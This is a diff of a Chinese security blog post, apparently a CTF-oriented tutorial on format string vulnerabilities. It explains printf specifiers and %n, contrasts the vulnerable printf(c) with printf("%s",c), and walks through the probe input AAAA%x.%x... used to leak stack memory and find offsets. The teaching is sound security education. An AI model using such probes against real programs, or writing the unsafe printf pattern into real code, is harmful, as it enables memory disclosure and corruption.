@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>详细格式化字符串漏洞原理 · MUZIBing&#39;s BLOG</title>
+    <title>详解格式化字符串漏洞 · MUZIBing&#39;s BLOG</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -232,7 +232,7 @@
                 <a href="/">MUZIBing&#39;s BLOG</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">详细格式化字符串漏洞原理</a>
+                <a href="#" class="post-name">详解格式化字符串漏洞</a>
             </div>
     </div>
     
@@ -262,7 +262,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            详细格式化字符串漏洞原理
+            详解格式化字符串漏洞
             <!-- 404 -->
             
         </h1>
@@ -287,7 +287,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">4.5k</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">4.6k</span>阅读时长: <span class="post-count reading-time">18 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -416,50 +416,41 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h3 id="font-color-navy0x00-前言font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-前言font"></a> <font color="navy"><code>0x00 前言</code></font></h3>
-<p>      格式化字符串漏洞是在CWE<sup>[1]</sup>（Common Weakness Enumeration，通用缺陷枚举）例表中的编号为<a href="https://cwe.mitre.org/data/definitions/134.html" target="_blank" rel="noopener">CWE-134</a>，由于在审计过程中很容易发现该漏洞，所以此类漏洞很少出现，但是在很多CTF还存在相关的题目，比如XCTF的<code>pwn新手练习区的 string</code>等，通过这两天的学习，发现还是有必要系统的归纳一下相关知识点，在这里我们以问题为导向展开学习。</p>
-<h3 id="font-colornavy0x01-格式化字符串font"><a class="markdownIt-Anchor" href="#font-colornavy0x01-格式化字符串font"></a> <font color="navy"><code>0x01 格式化字符串</code></font></h3>
-<h4 id="font-color-blueq1什么是格式化字符串-font"><a class="markdownIt-Anchor" href="#font-color-blueq1什么是格式化字符串-font"></a> <font color="blue"><code>Q1：什么是格式化字符串</code> </font></h4>
-<blockquote>
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><font color="navy"><code>0x00 前言</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;格式化字符串漏洞是在CWE<sup>[1]</sup>（Common Weakness Enumeration，通用缺陷枚举）例表中的编号为<a href="https://cwe.mitre.org/data/definitions/134.html" target="_blank" rel="noopener">CWE-134</a>，由于在审计过程中很容易发现该漏洞，所以此类漏洞很少出现，但是在很多CTF还存在相关的题目，比如XCTF的<code>pwn新手练习区的 string</code>等，通过这两天的学习，发现还是有必要系统的归纳一下相关知识点，在这里我们以问题为导向展开学习。</p>
+<h3 id="0x01-格式化字符串"><a href="#0x01-格式化字符串" class="headerlink" title="0x01 格式化字符串"></a><font color="navy"><code>0x01 格式化字符串</code></font></h3><h4 id="Q1：什么是格式化字符串"><a href="#Q1：什么是格式化字符串" class="headerlink" title="Q1：什么是格式化字符串 "></a><font color="blue"><code>Q1：什么是格式化字符串</code> </font></h4><blockquote>
 <p><strong>格式化字符串</strong>（<strong>format string</strong>）是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。<sup>[2]</sup></p>
 </blockquote>
-<p>      上述内容是wiki对格式化字符串的解释，简单来说，格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。<sup>[3]</sup> 比如：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上述内容是wiki对格式化字符串的解释，简单来说，格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。<sup>[3]</sup> 比如：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Hello %s, Your ID is %d"</span>, name, &amp;ID)</span><br></pre></td></tr></table></figure>
-<p>      对于**格式化函数<code>printf</code>**来说，<code>&quot;Hello %s, Your ID is %d&quot;</code>是printf函数的第一个参数，该参数被称为<font color="red"><code>格式化字符串</code></font>，<code>name</code>是printf函数的第二个参数，<code>&amp;ID</code>是printf函数的第三个参数，其中<code>%s</code>控制<code>name</code>的输出，<code>%d</code>控制着<code>&amp;ID</code>的输出；</p>
-<p>      对于**格式化字符串 <code>&quot;Hello &amp;s, Your ID is %d&quot;</code>**来讲，<code>name</code>是它的第一个参数，<code>&amp;ID</code>是它的第二个参数；</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于<strong>格式化函数<code>printf</code></strong>来说，<code>&quot;Hello %s, Your ID is %d&quot;</code>是printf函数的第一个参数，该参数被称为<font color="red"><code>格式化字符串</code></font>，<code>name</code>是printf函数的第二个参数，<code>&amp;ID</code>是printf函数的第三个参数，其中<code>%s</code>控制<code>name</code>的输出，<code>%d</code>控制着<code>&amp;ID</code>的输出；</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于<strong>格式化字符串 <code>&quot;Hello &amp;s, Your ID is %d&quot;</code></strong>来讲，<code>name</code>是它的第一个参数，<code>&amp;ID</code>是它的第二个参数；</p>
 <p><img src="/images/119-1.png" alt></p>
 <blockquote>
 <p>例如上图:</p>
 <ul>
-<li>
-<p>printf函数第一个参数（格式化字符串）的地址为<code>0xffffd8a0</code>，该地址指向地址<code>0x804a00b</code>，位于栈顶<code>esp</code>；</p>
+<li><p>printf函数第一个参数（格式化字符串）的地址为<code>0xffffd8a0</code>，该地址指向地址<code>0x804a00b</code>，位于栈顶<code>esp</code>；</p>
 </li>
-<li>
-<p>printf函数第二个参数的地址为<code>0xffffd8b8</code>，在栈中处于<code>0xffffd8a4</code>，<code>esp+4</code>；</p>
+<li><p>printf函数第二个参数的地址为<code>0xffffd8b8</code>，在栈中处于<code>0xffffd8a4</code>，<code>esp+4</code>；</p>
 </li>
-<li>
-<p>第三个参数为<code>0x2</code>，通过栈可以看出该数值被存放在地址为<code>0xffffd8a8</code>，栈中为<code>esp+8</code></p>
-</li>
+<li>第三个参数为<code>0x2</code>，通过栈可以看出该数值被存放在地址为<code>0xffffd8a8</code>，栈中为<code>esp+8</code></li>
 </ul>
 <p>通过上面的例子，可以看出，该printf函数的格式化字符串中有两个控制字符<code>%s</code>和<code>%d</code>，<strong>说明栈中两个连续的高地址是格式化字符串的第1，2个参数，也是printf函数的第2，3个参数。</strong></p>
 </blockquote>
-<h4 id="font-color-blueq2格式化字符串函数的作用是什么-font"><a class="markdownIt-Anchor" href="#font-color-blueq2格式化字符串函数的作用是什么-font"></a> <font color="blue"><code>Q2：格式化字符串函数的作用是什么？</code> </font></h4>
-<p>      格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。<sup>[3]</sup></p>
-<h4 id="font-color-blueq3格式化字符串函数的组成是什么-font"><a class="markdownIt-Anchor" href="#font-color-blueq3格式化字符串函数的组成是什么-font"></a> <font color="blue"><code>Q3：格式化字符串函数的组成是什么？</code> </font></h4>
-<p>      格式化字符串有着自己固定的格式，由三部分组成：</p>
+<h4 id="Q2：格式化字符串函数的作用是什么？"><a href="#Q2：格式化字符串函数的作用是什么？" class="headerlink" title="Q2：格式化字符串函数的作用是什么？ "></a><font color="blue"><code>Q2：格式化字符串函数的作用是什么？</code> </font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。<sup>[3]</sup></p>
+<h4 id="Q3：格式化字符串函数的组成是什么？"><a href="#Q3：格式化字符串函数的组成是什么？" class="headerlink" title="Q3：格式化字符串函数的组成是什么？ "></a><font color="blue"><code>Q3：格式化字符串函数的组成是什么？</code> </font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;格式化字符串有着自己固定的格式，由三部分组成：</p>
 <ul>
 <li>格式化字符串函数，比如<code>printf函数</code></li>
 <li>格式化字符串，比如<code>&quot;Hello %s, Your ID is %d&quot;</code></li>
 <li>后续参数（可选），比如<code>name</code>和<code>&amp;ID</code></li>
 </ul>
-<h4 id="font-color-blueq4格式化字符串的格式是什么-fontsup23sup"><a class="markdownIt-Anchor" href="#font-color-blueq4格式化字符串的格式是什么-fontsup23sup"></a> <font color="blue"><code>Q4：格式化字符串的格式是什么？</code> </font><sup>[2]&amp;[3]</sup></h4>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>
-<p><code>parameter</code>：n$，获取格式化字符串中的指定参数；n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了<em>parameter</em>，则其他所有占位符必须也使用<em>parameter</em>。这是<a href="https://zh.wikipedia.org/wiki/POSIX" target="_blank" rel="noopener">POSIX</a>扩展，不属于<a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">ISO C</a>。例：printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)，产生&quot;<code>17 0x11; 16 0x10</code>&quot;</p>
+<h4 id="Q4：格式化字符串的格式是什么？-2-amp-3"><a href="#Q4：格式化字符串的格式是什么？-2-amp-3" class="headerlink" title="Q4：格式化字符串的格式是什么？ [2]&amp;[3]"></a><font color="blue"><code>Q4：格式化字符串的格式是什么？</code> </font><sup>[2]&amp;[3]</sup></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>
+<p><code>parameter</code>：n$，获取格式化字符串中的指定参数；n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了<em>parameter</em>，则其他所有占位符必须也使用<em>parameter</em>。这是<a href="https://zh.wikipedia.org/wiki/POSIX" target="_blank" rel="noopener">POSIX</a>扩展，不属于<a href="https://zh.wikipedia.org/wiki/C语言" target="_blank" rel="noopener">ISO C</a>。例：printf(“%2$d %2$#x; %1$d %1$#x”,16,17)，产生”<code>17 0x11; 16 0x10</code>“</p>
 <p><code>flags</code>：（此项省略）</p>
 <p><code>field width</code>：输出的最小宽度；</p>
 <p><code>Precision</code>：通常指明输出的最大长度，依赖于特定的格式化类型；</p>
 <p><code>Length</code>：指出浮点型参数或整型参数的长度；</p>
 <p><code>type</code>：</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -470,7 +461,7 @@ height:50vh;
 <tbody>
 <tr>
 <td style="text-align:center">d/i</td>
-<td style="text-align:left">有符号十进制数值<code>int</code>。’<code>%d</code>‘与’<code>%i</code>'对于输出是同义；<br>但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或0时，分别表示16进制或8进制的值。<br>如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
+<td style="text-align:left">有符号十进制数值<code>int</code>。’<code>%d</code>‘与’<code>%i</code>‘对于输出是同义；<br>但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或0时，分别表示16进制或8进制的值。<br>如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
 </tr>
 <tr>
 <td style="text-align:center">u</td>
@@ -494,7 +485,7 @@ height:50vh;
 </tr>
 <tr>
 <td style="text-align:center">p</td>
-<td style="text-align:left">void * 型，输出对应变量的值。<br>printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值;<br>printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。</td>
+<td style="text-align:left">void * 型，输出对应变量的值。<br>printf(“%p”,a) 用地址的格式打印变量 a 的值;<br>printf(“%p”, &amp;a) 打印变量 a 所在的地址。</td>
 </tr>
 <tr>
 <td style="text-align:center">x/X</td>
@@ -502,10 +493,11 @@ height:50vh;
 </tr>
 <tr>
 <td style="text-align:center">%</td>
-<td style="text-align:left">'<code>%</code>'字面值，不接受任何 flags, width。</td>
+<td style="text-align:left">‘<code>%</code>‘字面值，不接受任何 flags, width。</td>
 </tr>
 </tbody>
 </table>
+</div>
 <p><code>特别说明</code></p>
 <blockquote>
 <p>这里简单的介绍一下<code>%n</code>控制符，下面会用到：</p>
@@ -513,9 +505,9 @@ height:50vh;
 </blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc str.c -m32 -o str</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> c = <span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"the use of %n"</span>, &amp;c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>上述结果为<code>11</code>，也就是<code>the use of</code>的长度。**具体原理：**当<code>printf</code>在输出格式化字符串的时候，会维护一个内部指针，当<code>printf</code>逐步将格式化字符串的字符打印到屏幕，当遇到<code>%</code>的时候，<code>printf</code>会期望它后面跟着一个格式字符串，因此会递增内部字符串以抓取格式控制符的输入值。这就是问题所在，<code>printf</code>无法知道栈上是否放置了正确数量的变量供它操作，如果没有足够的变量可供操作，而指针按正常情况下递增，就会产生越界访问。甚至由于%n的问题，可导致任意地址读写。<sup>[5]</sup></p>
+<p>上述结果为<code>11</code>，也就是<code>the use of</code>的长度。<strong>具体原理：</strong>当<code>printf</code>在输出格式化字符串的时候，会维护一个内部指针，当<code>printf</code>逐步将格式化字符串的字符打印到屏幕，当遇到<code>%</code>的时候，<code>printf</code>会期望它后面跟着一个格式字符串，因此会递增内部字符串以抓取格式控制符的输入值。这就是问题所在，<code>printf</code>无法知道栈上是否放置了正确数量的变量供它操作，如果没有足够的变量可供操作，而指针按正常情况下递增，就会产生越界访问。甚至由于%n的问题，可导致任意地址读写。<sup>[5]</sup></p>
 </blockquote>
-<h4 id="font-color-blueq5常见的格式化字符串函数有哪些-fontsup3sup"><a class="markdownIt-Anchor" href="#font-color-blueq5常见的格式化字符串函数有哪些-fontsup3sup"></a> <font color="blue"><code>Q5：常见的格式化字符串函数有哪些？</code> </font><sup>[3]</sup></h4>
+<h4 id="Q5：常见的格式化字符串函数有哪些？-3"><a href="#Q5：常见的格式化字符串函数有哪些？-3" class="headerlink" title="Q5：常见的格式化字符串函数有哪些？ [3]"></a><font color="blue"><code>Q5：常见的格式化字符串函数有哪些？</code> </font><sup>[3]</sup></h4><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -587,8 +579,8 @@ height:50vh;
 </tr>
 </tbody>
 </table>
-<h3 id="font-colornavy0x02-格式化字符串漏洞原理font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-格式化字符串漏洞原理font"></a> <font color="navy"><code>0x02 格式化字符串漏洞原理</code></font></h3>
-<p>      在<code>Q1</code>中我们已经介绍了什么是格式化字符串，并且用例子也进一步说明，那么现在主要介绍一下格式化字符漏洞原理：格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>，所以当prinf函数没有格式化字符串时，我们可以通过输入控制字符来泄露内存信息，用下面的代码为例：</p>
+</div>
+<h3 id="0x02-格式化字符串漏洞原理"><a href="#0x02-格式化字符串漏洞原理" class="headerlink" title="0x02 格式化字符串漏洞原理"></a><font color="navy"><code>0x02 格式化字符串漏洞原理</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>Q1</code>中我们已经介绍了什么是格式化字符串，并且用例子也进一步说明，那么现在主要介绍一下格式化字符漏洞原理：格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>，所以当prinf函数没有格式化字符串时，我们可以通过输入控制字符来泄露内存信息，用下面的代码为例：</p>
 <blockquote>
 <p>正常应该这样写：</p>
 </blockquote>
@@ -597,6 +589,7 @@ height:50vh;
 <p>正常结果为</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">Fail</span><br></pre></td></tr></table></figure>
+<p>&gt;</p>
 <blockquote>
 <p>由于开发者的粗心或者偷懒，将上述代码写成如下所示：</p>
 </blockquote>
@@ -608,15 +601,15 @@ height:50vh;
 <blockquote>
 <p>我们就以这个简单的例子入手，来梳理和讲解格式化字符串漏洞原理。</p>
 </blockquote>
-<h4 id="font-color-blueq1printfsc和printfc有什么区别font"><a class="markdownIt-Anchor" href="#font-color-blueq1printfsc和printfc有什么区别font"></a> <font color="blue"><code>Q1：printf(&quot;%s&quot;,c);和printf(c);有什么区别？</code></font></h4>
-<p><img src="/images/119-2.jpg" alt></p>
-<p>      这里主要看stack中的情况，其中左边的是<code>printf(&quot;%s&quot;,c);</code>语句，右边是<code>printf(c);</code>语句，从code中可以看出 printf 函数的<code>arg[0]</code>（格式化字符串）的地址并不一样，但是从 <code>stack</code> 中可以看到 esp 的地址，也就是两种情况格式化字符串在栈中的存储地址都是<code>0xffffd8a0</code>，由此可以看出</p>
+<h4 id="Q1：printf-quot-s-quot-c-和printf-c-有什么区别？"><a href="#Q1：printf-quot-s-quot-c-和printf-c-有什么区别？" class="headerlink" title="Q1：printf(&quot;%s&quot;,c);和printf(c);有什么区别？"></a><font color="blue"><code>Q1：printf(&quot;%s&quot;,c);和printf(c);有什么区别？</code></font></h4><p><img src="/images/119-2.jpg" alt></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里主要看stack中的情况，其中左边的是<code>printf(&quot;%s&quot;,c);</code>语句，右边是<code>printf(c);</code>语句，从code中可以看出 printf 函数的<code>arg[0]</code>（格式化字符串）的地址并不一样，但是从 <code>stack</code> 中可以看到 esp 的地址，也就是两种情况格式化字符串在栈中的存储地址都是<code>0xffffd8a0</code>，由此可以看出</p>
 <ul>
 <li><code>printf(&quot;%s&quot;,c);</code>的格式化字符串为<code>%s</code></li>
 <li><code>printf(c);</code>的格式化字符串为我们输入的<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>，在这里我们可以把<code>printf(c);</code>当作<code>printf(&quot;AAAA%x.%x.%x.%x.%x.%x.%x&quot;);</code>后续参数被省略掉，也就是说格式化字符串要打印的参数有<code>7</code>个，所以从格式化字符串的地址依次<code>+4</code>，则打印的参数地址为<code>esp+0x4</code>、<code>esp+0x8</code>、<code>esp+0xc</code>、<code>esp+0x10</code>、<code>esp+0x14</code>、<code>esp+0x18</code>、<code>esp+1c</code>，那么对于上图中的例子，输出的结果为：</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：AAAA%x.%x.%x.%x.%x.%x.%x</span><br><span class="line">输出：AAAAffffd8b4.0.8049189.f7fb33fc.41414141.252e7825.78252e78</span><br><span class="line">Fail</span><br></pre></td></tr></table></figure>
-<p>       上述结果分别对应：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上述结果分别对应：</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -632,35 +625,35 @@ height:50vh;
 <td style="text-align:center">esp</td>
 <td style="text-align:center">格式化字符串</td>
 <td style="text-align:center">1</td>
-<td style="text-align:left">0xffffd8a0 --&gt; 0xffffd8b4</td>
+<td style="text-align:left">0xffffd8a0 —&gt; 0xffffd8b4</td>
 <td style="text-align:center">AAAA</td>
 </tr>
 <tr>
 <td style="text-align:center">esp+0x4</td>
 <td style="text-align:center">1</td>
 <td style="text-align:center">2</td>
-<td style="text-align:left">0xffffd8a4 --&gt; 0xffffd8b4</td>
+<td style="text-align:left">0xffffd8a4 —&gt; 0xffffd8b4</td>
 <td style="text-align:center">ffffd8b</td>
 </tr>
 <tr>
 <td style="text-align:center">esp+0x8</td>
 <td style="text-align:center">2</td>
 <td style="text-align:center">3</td>
-<td style="text-align:left">0xffffd8a8 --&gt; 0x0</td>
+<td style="text-align:left">0xffffd8a8 —&gt; 0x0</td>
 <td style="text-align:center">0</td>
 </tr>
 <tr>
 <td style="text-align:center">esp+0xc</td>
 <td style="text-align:center">3</td>
 <td style="text-align:center">4</td>
-<td style="text-align:left">0xffffd8ac --&gt; 0x8049189</td>
+<td style="text-align:left">0xffffd8ac —&gt; 0x8049189</td>
 <td style="text-align:center">8049189</td>
 </tr>
 <tr>
 <td style="text-align:center">esp+0x10</td>
 <td style="text-align:center">4</td>
 <td style="text-align:center">5</td>
-<td style="text-align:left">0xffffd8b0 --&gt; 0xf7fb33fc</td>
+<td style="text-align:left">0xffffd8b0 —&gt; 0xf7fb33fc</td>
 <td style="text-align:center">f7fb33fc</td>
 </tr>
 <tr>
@@ -674,7 +667,7 @@ height:50vh;
 <td style="text-align:center">esp+0x18</td>
 <td style="text-align:center">6</td>
 <td style="text-align:center">7</td>
-<td style="text-align:left">0xffffd8b8 (&quot;%x.%&quot;)</td>
+<td style="text-align:left">0xffffd8b8 (“%x.%”)</td>
 <td style="text-align:center">252e7825</td>
 </tr>
 <tr>
@@ -686,24 +679,24 @@ height:50vh;
 </tr>
 </tbody>
 </table>
-<h4 id="font-color-blueq2为什么要输入aaaaxxxxxxxfont"><a class="markdownIt-Anchor" href="#font-color-blueq2为什么要输入aaaaxxxxxxxfont"></a> <font color="blue"><code>Q2：为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x?</code></font></h4>
-<p>      在了解为什么要输入这个字符串之前，我们先来看看在运行程序时，局部变量存储的位置，这里就要清楚运行时栈的情况，如下图：</p>
+</div>
+<h4 id="Q2：为什么要输入AAAA-x-x-x-x-x-x-x"><a href="#Q2：为什么要输入AAAA-x-x-x-x-x-x-x" class="headerlink" title="Q2：为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x?"></a><font color="blue"><code>Q2：为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x?</code></font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在了解为什么要输入这个字符串之前，我们先来看看在运行程序时，局部变量存储的位置，这里就要清楚运行时栈的情况，如下图：</p>
 <p><img src="/images/119-3.jpg" alt></p>
-<p>      从上图可以看出，<strong>局部变量被存储在栈中</strong>（这里要说明的是全局变量被存储在.data段中），这里还是用<code>code2</code>的代码作为例子，看看<code>main</code>函数中变量 a、b 和 c 存放的位置，通过gdb进行调试，首先来确定变量 a 和 b 的位置，如下图：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上图可以看出，<strong>局部变量被存储在栈中</strong>（这里要说明的是全局变量被存储在.data段中），这里还是用<code>code2</code>的代码作为例子，看看<code>main</code>函数中变量 a、b 和 c 存放的位置，通过gdb进行调试，首先来确定变量 a 和 b 的位置，如下图：</p>
 <p><img src="/images/119-4.png" alt></p>
-<p>      下面我们再来寻找 c 的位置，如下图：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面我们再来寻找 c 的位置，如下图：</p>
 <p><img src="/images/119-5.png" alt></p>
-<p>      从上图中得信息可以得出局部变量 a、b 和 c 在栈中的情况，如下图：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上图中得信息可以得出局部变量 a、b 和 c 在栈中的情况，如下图：</p>
 <p><img src="/images/119-6.png" alt></p>
 <p><code>printf(&quot;%s&quot;,c); + 输入：AAAAAAAAAAAAAAAAAAAA</code></p>
-<p>      下面我们先来看看如果遇到正常的输出<code>printf(&quot;%s&quot;,c);</code>，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面我们先来看看如果遇到正常的输出<code>printf(&quot;%s&quot;,c);</code>，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图：</p>
 <p><img src="/images/119-7.png" alt></p>
 <blockquote>
 <p>输出结果为<code>AAAAAAAAAAAAAAAAAAAA</code>。从上图和结果可以看到esp处的是<code>格式化字符串</code>，里面只有一个控制字符<code>%s</code>，所以格式化字符串只有一参数，位于<code>esp+0x4</code> 处，那么输出的结果就是<code>esp+4</code>指向地址所对应的值<code>AAAAAAAAAAAAAAAAAAAA</code>。</p>
 <p>注：这里有一点需要注意，任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向字符串首地址的指针，作用是输出这个字符串。<sup>[4]</sup></p>
 </blockquote>
 <p><code>printf(c); + 输入：AAAAAAAAAAAAAAAAAAAA</code></p>
-<p>      下面我们先来看看如果遇到<code>printf(c);</code>，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面我们先来看看如果遇到<code>printf(c);</code>，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图：</p>
 <p><img src="/images/119-8.png" alt></p>
 <blockquote>
 <p>输出结果为<code>AAAAAAAAAAAAAAAAAAAA</code>，虽然这里也是输出20个重复的A，但是和上面的情况完全不一样，这里是因为格式化字符串中没有控制符，所以只将格式化字符串输出，这里一定要分清。</p>
@@ -715,14 +708,11 @@ height:50vh;
 <li>因为我们能控制的只有 c 的输入，所以我们可以通过<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>来查找 c 的起始地址（也可以说成参数偏移），从而可以进一步利用我们的输入来改相应的值</li>
 </ul>
 </blockquote>
-<h4 id="font-color-blueq3利用格式化字符串漏洞能做社么fontsup3sup"><a class="markdownIt-Anchor" href="#font-color-blueq3利用格式化字符串漏洞能做社么fontsup3sup"></a> <font color="blue"><code>Q3：利用格式化字符串漏洞能做社么?</code></font><sup>[3]</sup></h4>
-<p>      通过对格式化字符串漏洞的利用，可以实现如下功能：</p>
+<h4 id="Q3：利用格式化字符串漏洞能做社么-3"><a href="#Q3：利用格式化字符串漏洞能做社么-3" class="headerlink" title="Q3：利用格式化字符串漏洞能做社么?[3]"></a><font color="blue"><code>Q3：利用格式化字符串漏洞能做社么?</code></font><sup>[3]</sup></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过对格式化字符串漏洞的利用，可以实现如下功能：</p>
 <ul>
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_2" target="_blank" rel="noopener">程序崩溃</a></li>
-<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_3" target="_blank" rel="noopener">泄露内存</a>
-<ul>
-<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_4" target="_blank" rel="noopener">泄露栈内存</a>
-<ul>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_3" target="_blank" rel="noopener">泄露内存</a><ul>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_4" target="_blank" rel="noopener">泄露栈内存</a><ul>
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_5" target="_blank" rel="noopener">获取栈变量数值</a></li>
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_6" target="_blank" rel="noopener">获取栈变量对应字符串</a></li>
 </ul>
@@ -730,17 +720,14 @@ height:50vh;
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_7" target="_blank" rel="noopener">泄露任意地址内存</a></li>
 </ul>
 </li>
-<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_8" target="_blank" rel="noopener">覆盖内存</a>
-<ul>
